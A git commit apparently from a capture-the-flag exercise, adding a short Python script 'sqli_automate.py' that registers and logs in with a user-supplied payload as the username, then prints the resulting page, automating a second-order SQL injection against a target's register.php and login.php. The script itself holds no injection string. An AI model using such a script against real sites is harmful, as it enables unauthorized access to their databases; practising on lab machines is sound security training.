2670b4cb2dce9f5e0f20919a7fd5d57eea473e38
Abishek-Kumar-GHub <abishek.techy@gmail.com>
2026-07-15 12:32:53 +0530

    Last

---
+++ Rabbit-hole/sqli_automate.py
@@ -0,0 +1,13 @@
+#!/usr/bin/env python3
+
+import requests
+import sys
+
+url_base = sys.argv[1]
+payload = sys.argv[2]
+
+s = requests.session()
+s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
+s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})
+r = s.get(url_base)
+print(r.text)
